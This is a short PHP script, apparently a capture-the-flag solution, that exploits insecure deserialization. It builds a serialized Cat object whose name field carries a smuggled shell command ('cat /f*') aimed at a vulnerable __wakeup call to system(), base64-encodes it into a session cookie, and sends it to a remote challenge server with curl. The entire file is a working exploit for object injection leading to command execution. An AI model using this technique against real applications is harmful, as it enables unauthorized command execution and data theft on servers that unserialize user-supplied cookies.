<?php
    class Cat {
        public $name = '(guest cat)';
        function __construct($name) {
            $this->name = $name;
        }
        function __wakeup() {
            echo "<pre>";
            system("echo 'Welcome back, $this->name'");
            echo "</pre>";
        }
    }
    
    $cat = new Cat("cat_" . rand(0, 0xffff));
    echo serialize($cat) . "\n";

    $cmd = 'cat /f*';
    $len = strlen($cmd) + 3;
    $badcat = "O:3:\"Cat\":1:{s:4:\"name\";s:$len:\"';$cmd'\";}";
    echo $badcat . "\n";

    $badcat = base64_encode($badcat);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://h4ck3r.quest:8601/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    curl_setopt($ch, CURLOPT_COOKIE, "cat_session=$badcat");

    $output = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    
    echo $output . "\n";
?>